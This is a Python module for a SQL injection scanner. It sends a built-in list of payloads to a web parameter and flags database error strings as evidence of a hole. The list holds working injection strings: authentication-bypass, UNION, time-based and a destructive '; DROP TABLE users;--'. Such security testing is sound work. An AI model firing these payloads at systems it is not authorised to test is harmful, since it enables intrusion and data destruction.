"""SQL Injection testing module"""

from dataclasses import dataclass
from enum import Enum
from typing import Any


class InjectionType(Enum):
    """Types of SQL injection attacks."""

    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    STACKED_QUERIES = "stacked_queries"


@dataclass
class SQLInjectionPayload:
    """
    SQL Injection test payload.

    Attributes:
        payload: The injection string to test
        injection_type: Type of SQL injection
        description: Description of what this payload tests
        expected_patterns: List of patterns indicating successful injection
        database_types: List of database types this works on (e.g., ['mysql', 'postgresql'])
    """

    payload: str
    injection_type: InjectionType
    description: str
    expected_patterns: list[str]
    database_types: list[str]


class SQLInjectionTester:
    """
    Tester for SQL injection vulnerabilities.

    This class provides methods to test web applications for SQL injection
    vulnerabilities using various payload types and detection methods.

    Example:
        tester = SQLInjectionTester()

        results = await tester.test_parameter(
            http_client=client,
            target_url="http://example.com/search",
            parameter="q",
            method="GET"
        )

        if results["vulnerable"]:
            print(f"SQL Injection found: {results['injection_type']}")
    """

    # Common SQL injection payloads
    DEFAULT_PAYLOADS: list[SQLInjectionPayload] = [
        # Error-based payloads
        SQLInjectionPayload(
            payload="'",
            injection_type=InjectionType.ERROR_BASED,
            description="Single quote to trigger syntax error",
            expected_patterns=[
                "sql syntax",
                "mysql_fetch",
                "pg_query",
                "sqlserver",
                "odbc",
                "syntax error",
            ],
            database_types=["mysql", "postgresql", "mssql", "sqlite", "oracle"],
        ),
        SQLInjectionPayload(
            payload="''",
            injection_type=InjectionType.ERROR_BASED,
            description="Double quote to test string handling",
            expected_patterns=["unterminated", "quoted string"],
            database_types=["mysql", "postgresql", "mssql", "sqlite"],
        ),
        SQLInjectionPayload(
            payload="' OR '1'='1",
            injection_type=InjectionType.BOOLEAN_BASED,
            description="Classic OR condition to bypass authentication",
            expected_patterns=[],
            database_types=["mysql", "postgresql", "mssql", "sqlite", "oracle"],
        ),
        SQLInjectionPayload(
            payload="' OR 1=1--",
            injection_type=InjectionType.BOOLEAN_BASED,
            description="Comment-based bypass",
            expected_patterns=[],
            database_types=["mysql", "postgresql", "mssql", "sqlite"],
        ),
        SQLInjectionPayload(
            payload="' UNION SELECT null--",
            injection_type=InjectionType.UNION_BASED,
            description="UNION-based injection test",
            expected_patterns=["union", "select"],
            database_types=["mysql", "postgresql", "mssql", "sqlite"],
        ),
        SQLInjectionPayload(
            payload="'; DROP TABLE users;--",
            injection_type=InjectionType.STACKED_QUERIES,
            description="Stacked queries test (dangerous)",
            expected_patterns=[],
            database_types=["mssql", "postgresql"],
        ),
        SQLInjectionPayload(
            payload="' AND SLEEP(5)--",
            injection_type=InjectionType.TIME_BASED,
            description="MySQL time-based blind injection",
            expected_patterns=[],
            database_types=["mysql"],
        ),
        SQLInjectionPayload(
            payload="'; WAITFOR DELAY '0:0:5'--",
            injection_type=InjectionType.TIME_BASED,
            description="MSSQL time-based blind injection",
            expected_patterns=[],
            database_types=["mssql"],
        ),
        SQLInjectionPayload(
            payload="' AND pg_sleep(5)--",
            injection_type=InjectionType.TIME_BASED,
            description="PostgreSQL time-based blind injection",
            expected_patterns=[],
            database_types=["postgresql"],
        ),
    ]

    def __init__(self, payloads: list[SQLInjectionPayload] | None = None):
        """
        Initialize SQL injection tester.

        Args:
            payloads: Custom list of payloads (uses defaults if None)
        """
        self.payloads = payloads or self.DEFAULT_PAYLOADS
        self._results: list[dict[str, Any]] = []

    async def test_parameter(
        self,
        http_client: Any,
        target_url: str,
        parameter: str,
        method: str = "GET",
        original_value: str = "test",
    ) -> dict[str, Any]:
        """
        Test a specific parameter for SQL injection vulnerabilities.

        Args:
            http_client: HTTP client with async request methods
            target_url: URL to test
            parameter: Parameter name to test
            method: HTTP method (GET or POST)
            original_value: Original parameter value for comparison

        Returns:
            Dictionary with test results
        """
        self._results = []
        vulnerabilities = []

        # First, get baseline response with original value
        baseline_response = await self._make_request(
            http_client, target_url, method, {parameter: original_value}
        )

        # Test each payload
        for payload in self.payloads:
            result = await self._test_payload(
                http_client, target_url, parameter, method, payload, baseline_response
            )

            self._results.append(result)

            if result["vulnerable"]:
                vulnerabilities.append(result)

        return {
            "parameter": parameter,
            "target_url": target_url,
            "method": method,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "all_tests": self._results,
            "recommendations": self._get_recommendations(vulnerabilities),
        }

    async def _make_request(
        self, http_client: Any, url: str, method: str, params: dict[str, str]
    ) -> dict[str, Any]:
        """
        Make HTTP request and capture response details.

        Args:
            http_client: HTTP client
            url: Target URL
            method: HTTP method
            params: Request parameters

        Returns:
            Dictionary with response details
        """
        try:
            if method.upper() == "GET":
                response = await http_client.get(url, params=params)
            else:
                response = await http_client.post(url, data=params)

            response_text = ""
            if hasattr(response, "text"):
                response_text = response.text
            elif hasattr(response, "content"):
                response_text = response.content.decode("utf-8", errors="ignore")

            return {
                "status_code": getattr(response, "status_code", 200),
                "text": response_text,
                "headers": dict(getattr(response, "headers", {})),
                "error": None,
            }
        except Exception as e:
            return {"status_code": 0, "text": "", "headers": {}, "error": str(e)}

    async def _test_payload(
        self,
        http_client: Any,
        target_url: str,
        parameter: str,
        method: str,
        payload: SQLInjectionPayload,
        baseline: dict[str, Any],
    ) -> dict[str, Any]:
        """
        Test a single SQL injection payload.

        Args:
            http_client: HTTP client
            target_url: Target URL
            parameter: Parameter name
            method: HTTP method
            payload: SQLInjectionPayload to test
            baseline: Baseline response for comparison

        Returns:
            Dictionary with test result
        """
        response = await self._make_request(
            http_client, target_url, method, {parameter: payload.payload}
        )

        is_vulnerable = False
        evidence = []

        # Check for error messages
        response_lower = response["text"].lower()
        for pattern in payload.expected_patterns:
            if pattern.lower() in response_lower:
                is_vulnerable = True
                evidence.append(f"Pattern '{pattern}' found in response")

        # Check for database error indicators
        error_indicators = [
            "sql syntax",
            "mysql_fetch",
            "pg_query",
            "sqlserver",
            "oracle",
            "syntax error",
            "unterminated",
            "quoted string not properly terminated",
        ]

        for indicator in error_indicators:
            if indicator in response_lower and indicator not in baseline["text"].lower():
                is_vulnerable = True
                evidence.append(f"Database error indicator: '{indicator}'")

        # Check for status code changes
        if response["status_code"] != baseline["status_code"] and response["status_code"] >= 500:
            is_vulnerable = True
            evidence.append(f"Server error status: {response['status_code']}")

        # Check for response time differences (time-based detection)
        if payload.injection_type == InjectionType.TIME_BASED:
            # Note: Actual time-based detection would require timing the request
            # This is a simplified version
            pass

        return {
            "payload": payload.payload,
            "injection_type": payload.injection_type.value,
            "description": payload.description,
            "vulnerable": is_vulnerable,
            "evidence": evidence,
            "response_status": response["status_code"],
            "database_types": payload.database_types,
        }

    def _get_recommendations(self, vulnerabilities: list[dict[str, Any]]) -> list[str]:
        """
        Generate security recommendations based on findings.

        Args:
            vulnerabilities: List of found vulnerabilities

        Returns:
            List of recommendation strings
        """
        if not vulnerabilities:
            return [
                "No SQL injection vulnerabilities detected. Continue to monitor for new attack vectors."
            ]

        recommendations = [
            "CRITICAL: SQL injection vulnerabilities detected!",
            "",
            "Immediate Actions Required:",
            "1. Use parameterized queries/prepared statements",
            "2. Implement input validation and sanitization",
            "3. Apply principle of least privilege to database accounts",
            "4. Enable database query logging for monitoring",
            "",
            "Additional Recommendations:",
            "5. Use an ORM framework to abstract database access",
            "6. Implement Web Application Firewall (WAF)",
            "7. Regular security audits and penetration testing",
            "8. Keep database software and drivers updated",
        ]

        return recommendations

    def add_payload(self, payload: SQLInjectionPayload) -> None:
        """
        Add a custom payload to the tester.

        Args:
            payload: SQLInjectionPayload to add
        """
        self.payloads.append(payload)

    def get_payloads_by_type(self, injection_type: InjectionType) -> list[SQLInjectionPayload]:
        """
        Get payloads filtered by injection type.

        Args:
            injection_type: Type of injection to filter by

        Returns:
            List of matching payloads
        """
        return [p for p in self.payloads if p.injection_type == injection_type]
